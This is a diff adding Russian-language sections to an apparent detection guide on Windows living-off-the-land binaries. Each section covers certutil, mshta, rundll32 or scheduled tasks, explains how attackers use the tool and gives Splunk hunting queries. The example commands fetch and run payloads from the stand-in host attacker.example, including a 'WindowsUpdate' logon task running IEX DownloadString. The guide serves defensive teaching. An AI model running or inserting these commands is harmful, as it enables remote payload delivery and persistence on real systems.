@@ -54,4 +54,77 @@ index=sysmon OR index=wineventlog (EventCode=1 OR EventCode=4688)
 ```
 
 ## Certutil
-Certutil это утилита Microsoft для управления сертификатами и кодированием и декодированием данных. Certutil предназначен для управления сертификатами, он может скачивать файлы вместе с `-urlcache` и декодировать base64 пейлоады, преобразовывать текстовые блоки в бинарные файлы.
+Certutil это утилита Microsoft для управления сертификатами и кодированием и декодированием данных. Certutil предназначен для управления сертификатами, он может скачивать файлы вместе с `-urlcache` и декодировать base64 пейлоады, преобразовывать текстовые блоки в бинарные файлы. Атакующие используют его потому что он подписан Microsotft и широко распространен в административных процессах. Он может получать файлы без использования curl и подобных утилит и обходит некоторые правила блокировки 
+
+Злоумышленники используют Certutil для скачивания файлов, декодирования base64 пейлоадов или для маскировки вредоносного кода как легитимные операции сертификации. Благодаря сетевым возможностям и функциям обработки файлов, это универсальный инструмент для подготовки полезных нагрузок или расшифровки зашифрованных скриптов.
+
+```powershell
+PS C:\> certutil -urlcache -split -f "http://attacker.example/payload.exe" C:\Users\Public\payload.exe  
+PS C:\> certutil -decode C:\Users\Public\encoded.b64 C:\Users\Public\decoded.exe  
+PS C:\> certutil -encode C:\Users\Public\payload.exe C:\Users\Public\payload.b64
+```
+
+В первой команде `-urlcache -split -f` флаги позволяют получить удаленный url и записать это в специальный локальный путь, как результат, файл доставлен на диск и может быть исполнен позже
+Во второй команде certutil читает base64 текстовый файл, декодирует и записывает результат в бинарник, так атакующий может перемещать бинарные данные как текст а после воспроизводить его на хосте
+Третья команда кодирует бинарник в base654. Это можно использовать для обфускации пейлоада во время подготовки и транспортировки 
+
+```
+index=sysmon OR index=wineventlog (EventCode=1 OR EventCode=4688 OR EventCode=4663) 
+(Image="*\\certutil.exe" OR CommandLine="*certutil*")
+(CommandLine="* -urlcache * -f *" OR CommandLine="* -decode *" OR CommandLine="* -encode *")
+| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine
+```
+
+## MSHTA
+MSHTA запускает HTML файлы, который могут содержать VBScript или код JavaScript
+
+```powershell
+PS C:\> mshta "http://attacker.example/payload.hta"  
+PS C:\> mshta "javascript:var s=new ActiveXObject('WScript.Shell');s.Run('powershell -NoP -NonI -W Hidden -Command "Start-Process calc.exe"');close();"  
+PS C:\> mshta "C:\Users\Public\malicious.hta"
+```
+
+В первой команде, mshta загружает HTA с удаленного сервера и исполняет HTA на хосте
+Во второй командой mshta получает встроенный URI JS который создает объект ActiveX WScript.Shell и использует его для запуска Powershell
+В третьей команде MSHTA выполняет запуск локального HTA файла, что полезно если злоумышленник распространяет HTA файл в виде вложения или размещает его на общем диске
+
+```
+index=sysmon (EventCode=1 OR EventCode=4688) Image="*\\mshta.exe" (CommandLine="*http*://*" OR CommandLine="*javascript:*" OR CommandLine="*.hta")
+| stats count by host, user, ParentImage, CommandLine
+```
+## Rundll32
+Rundll32 исполняет специфические функции из DLL файлов
+
+```powershell
+PS C:\> rundll32.exe C:\Users\Public\backdoor.dll,Start  
+PS C:\> rundll32.exe url.dll,FileProtocolHandler "http://attacker.example/update.html"  
+PS C:\> rundll32.exe C:\Windows\Temp\loader.dll,Run
+```
+
+В первой команде rundll32 загружает специфическую dll и вызывает из нее экспортированную функцию Start, которая выполняет код DLL
+Во второй команде вызывается url.dll с FileProtocolHandler и удаленным URL, что заставляет системный обработчик обрабатывать удаленное содержимое, которое может инициализировать дальнейшую активность.
+Третья команда вызывается специально созданным экспортом во временную DLL, которая может выполнять встроенную логику загрузчика или шелл-код из файла, расположенного в доступном для записи месте 
+
+```
+index=sysmon (EventCode=1 OR EventCode=4688 OR EventCode=7) Image="*\\rundll32.exe" (CommandLine="*\\Users\\Public\\*" OR CommandLine="*url.dll,FileProtocolHandler*" OR CommandLine="*\\Windows\\Temp\\*")
+| stats count by host, user, ParentImage, CommandLine
+```
+
+## Scheduled tasks(schtasks/task Scheduler)
+Планировщик задач это встроенная функция автоматизации windows, он позволяет администраторам запускать программы или скрипты в указанное время, при таких событиях как вход в систему или по повторяющемуся расписанию. Задачи имеют имя, триггер(то есть когда запускать), действие(что запускать) и необязательную учетную запись для запуска условия. Поскольку это стандартный административный инструмент, задачи отображаются в обычных системных журналах и часто разрешены политикой, что делает его ценным механизмом как для легитимных операций, так и для обеспечения устойчивости злоумышленников
+Злоумышленники создают или изменяют задачи для обеспечения устойчивости после перезагрузки, для запуска кода при входе пользователя в систему или с регулярной переодичностью или для быстрого повторного запуска после удаления других артефактов, они часто выбирают имена задач, которые выглядят безобидными, например windowsUpdate или Maintenance, чтобы избежать привлечения внимания. Задачи могут запускать Powershell, подписанные инструменты или локальные скрипты.
+
+```powershell
+PS C:\> schtasks /Create /SC ONLOGON /TN "WindowsUpdate" /TR "powershell -NoP -NonI -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.example/ps1')\""  
+PS C:\> schtasks /Create /SC DAILY /TN "DailyJob" /TR "C:\Users\Public\encrypt.ps1" /ST 00:05  
+PS C:\> schtasks /Run /TN "WindowsUpdate"
+```
+
+В первой команде schtasks создается задача с именем WindowsUpdate, которая запускается при входе в систему, действие запускает PowerShell который загружает и выполняет удаленный скрипт при каждом входе пользователя в систему, обеспечивая постоянное присутствие
+Во второй команде schtasks планируется ежедневная задача с именем Daily Job, которая запускает локальный скрипт в 00:05 каждый день. Это может автоматизировать повторяющиеся вредоносные действия, такие как запланированное щифрование или поэтапный сбор данных
+В третьей команде schtasks злоумышленник запускает именованную задачу немедленно, вызывая настроенное действие по запросу
+
+```
+index=wineventlog EventCode=4698 OR EventCode=4699 OR index=sysmon (EventCode=1 OR EventCode=4688) (CommandLine="*schtasks* /Create*" OR CommandLine="*schtasks* /Run*" OR Image="*\\taskeng.exe" OR EventCode=4698)
+| stats count by host, user, EventCode, TaskName, CommandLine
+```
